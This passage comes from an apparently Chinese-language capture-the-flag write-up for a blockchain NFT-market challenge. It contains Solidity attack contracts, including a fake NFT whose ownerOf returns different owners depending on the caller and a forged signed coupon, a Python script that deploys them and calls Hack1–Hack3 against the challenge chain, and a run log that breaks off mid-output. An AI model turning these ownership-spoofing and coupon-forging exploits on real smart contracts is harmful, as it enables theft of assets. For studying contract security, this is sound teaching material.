</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>Hack3</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8</span> <span class=n>v</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes32</span> <span class=n>r</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes32</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>createOrder</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>NFT</span><span class=p>),</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>createOrder</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>FakeNFT</span><span class=p>),</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>createOrder</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>NFT</span><span class=p>),</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Order</span> <span class=k>memory</span> <span class=n>FakeOrder</span> <span class=o>=</span> <span class=n>Order</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>FakeNFT</span><span class=p>),</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Coupon</span> <span class=k>memory</span> <span class=n>FakeCoupon</span> <span class=o>=</span> <span class=n>Coupon</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>Me</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;want to get flag&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Signature</span> <span class=k>memory</span> <span class=n>FakeSignature</span> <span class=o>=</span> <span class=n>Signature</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=p>[</span><span class=n>r</span><span class=p>,</span> <span class=n>s</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>SignedCoupon</span> <span class=k>memory</span> <span class=n>FakeSignedCoupon</span> <span class=o>=</span> <span class=n>SignedCoupon</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>FakeCoupon</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>FakeSignature</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>purchaseWithCoupon</span><span class=p>(</span><span class=n>FakeSignedCoupon</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>Hack2</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>purchaseTest</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>NFT</span><span class=p>),</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>purchaseOrder</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>purchaseOrder</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>win</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>onERC721Received</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>this</span><span class=p>.</span><span class=n>onERC721Received</span><span class=p>.</span><span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>HackerNFT</span> <span class=k>is</span> <span class=n>ERC721</span><span class=p>,</span> <span class=n>Ownable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>Market</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>Verifier</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>Hacker</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>Me</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>_marketAddress</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>_verifierAddress</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>_me</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=n>ERC721</span><span class=p>(</span><span class=s>&#34;HackerNFT&#34;</span><span class=p>,</span> <span class=s>&#34;NFT&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span> <span class=o>=</span> <span class=n>_marketAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Verifier</span> <span class=o>=</span> <span class=n>_verifierAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Hacker</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Me</span> <span class=o>=</span> <span class=n>_me</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>_setApprovalForAll</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>Hacker</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>_setApprovalForAll</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Market</span><span class=p>),</span> <span class=n>Hacker</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>mint</span><span class=p>(</span><span class=kt>address</span> <span class=n>to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>tokenId</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=n>to</span><span class=p>,</span> <span class=n>tokenId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>ownerOf</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>tokenId</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>Verifier</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Me</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>Market</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Market</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Hacker</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>根据上述分析编写链上交互脚本（已给出详细注释）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Poseidon.Blockchain</span> <span class=kn>import</span> <span class=o>*</span>   <span class=c1># https://github.com/B1ue1nWh1te/Poseidon</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 连接至链</span>
</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=n>Chain</span><span class=p>(</span><span class=s2>&#34;http://140.210.217.225:8545&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 导入账户</span>
</span></span><span class=line><span class=cl><span class=n>account</span> <span class=o>=</span> <span class=n>Account</span><span class=p>(</span><span class=n>chain</span><span class=p>,</span> <span class=s2>&#34;13b0708eeaea2b2ec752d18f9e71780c3a51d29e3c6944ab171b1a568a4f01c3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 选择 Solidity 版本</span>
</span></span><span class=line><span class=cl><span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>SwitchSolidityVersion</span><span class=p>(</span><span class=s2>&#34;0.8.16&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 题目合约地址</span>
</span></span><span class=line><span class=cl><span class=n>MarketAddress</span> <span class=o>=</span> <span class=s2>&#34;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 编译攻击合约</span>
</span></span><span class=line><span class=cl><span class=n>abi</span><span class=p>,</span> <span class=n>bytecode</span> <span class=o>=</span> <span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>Compile</span><span class=p>(</span><span class=s2>&#34;hacker.sol&#34;</span><span class=p>,</span> <span class=s2>&#34;Hacker&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 部署攻击合约</span>
</span></span><span class=line><span class=cl><span class=n>Hacker</span> <span class=o>=</span> <span class=n>account</span><span class=o>.</span><span class=n>DeployContract</span><span class=p>(</span><span class=n>abi</span><span class=p>,</span> <span class=n>bytecode</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>MarketAddress</span><span class=p>)[</span><span class=s2>&#34;Contract&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 攻击 #1 NFT</span>
</span></span><span class=line><span class=cl><span class=n>Hacker</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;Hack1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取消息哈希以便进行签名</span>
</span></span><span class=line><span class=cl><span class=n>MessageHash</span> <span class=o>=</span> <span class=n>Hacker</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;GetMessageHashToSign&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 以 EIP-712 标准对消息哈希进行签名</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>SignMessageHash</span><span class=p>(</span><span class=n>MessageHash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>SignedData</span> <span class=o>=</span> <span class=n>chain</span><span class=o>.</span><span class=n>Net</span><span class=o>.</span><span class=n>eth</span><span class=o>.</span><span class=n>account</span><span class=o>.</span><span class=n>signHash</span><span class=p>(</span><span class=n>MessageHash</span><span class=p>,</span> <span class=n>account</span><span class=o>.</span><span class=n>PrivateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Signature</span> <span class=o>=</span> <span class=n>SignedData</span><span class=o>.</span><span class=n>signature</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>V</span> <span class=o>=</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=n>Signature</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>R</span> <span class=o>=</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=n>Signature</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>66</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>S</span> <span class=o>=</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=n>Signature</span><span class=p>[</span><span class=mi>66</span><span class=p>:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>(</span><span class=n>V</span><span class=p>,</span> <span class=n>R</span><span class=p>,</span> <span class=n>S</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 签名得到 v,r,s</span>
</span></span><span class=line><span class=cl><span class=n>V</span><span class=p>,</span> <span class=n>R</span><span class=p>,</span> <span class=n>S</span> <span class=o>=</span> <span class=n>SignMessageHash</span><span class=p>(</span><span class=n>MessageHash</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 攻击 #3 NFT</span>
</span></span><span class=line><span class=cl><span class=n>Hacker</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;Hack3&#34;</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>V</span><span class=p>,</span> <span class=mi>16</span><span class=p>),</span> <span class=n>R</span><span class=p>,</span> <span class=n>S</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 攻击 #2 NFT</span>
</span></span><span class=line><span class=cl><span class=n>Hacker</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;Hack2&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>运行日志如下（以下结果是写题解复现时的）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>18.027</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>32</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Chain</span><span class=p>][</span><span class=n>Connect</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>connected</span> <span class=n>to</span> <span class=p>[</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>140.210</span><span class=o>.</span><span class=mf>217.225</span><span class=p>:</span><span class=mi>8545</span><span class=p>]</span><span class=o>.</span> <span class=p>[</span><span class=n>Delay</span><span class=p>]</span> <span class=mi>128</span> <span class=n>ms</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>18.056</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>241</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>Import</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>import</span> <span class=n>account</span> <span class=p>[</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class=p>]</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>18.134</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>GetBalance</span><span class=p>:</span><span class=mi>122</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Chain</span><span class=p>][</span><span class=n>GetBalance</span><span class=p>][</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1000000000000000000</span> <span class=n>Wei</span><span class=p>]</span><span class=o>&lt;=&gt;</span><span class=p>[</span><span class=mi>1</span> <span class=n>Ether</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>信息</span><span class=p>:</span> <span class=err>用提供的模式无法找到文件。</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>18.423</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SwitchSolidityVersion</span><span class=p>:</span><span class=mi>580</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockchainUtils</span><span class=p>][</span><span class=n>SwitchSolidityVersion</span><span class=p>]</span><span class=n>Current</span> <span class=n>Version</span><span class=p>:</span> <span class=mf>0.8</span><span class=o>.</span><span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>19.125</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>Compile</span><span class=p>:</span><span class=mi>610</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockchainUtils</span><span class=p>][</span><span class=n>Compile</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>FileCourse</span><span class=p>]</span><span class=n>hacker</span><span class=o>.</span><span class=n>sol</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractName</span><span class=p>]</span><span class=n>Hacker</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ABI</span><span class=p>][{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;_marketAddress&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>}],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;constructor&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;GetMessageHashToSign&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>}],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;view&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;Hack1&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;Hack2&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;uint8&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;v&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;uint8&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes32&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;Hack3&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span 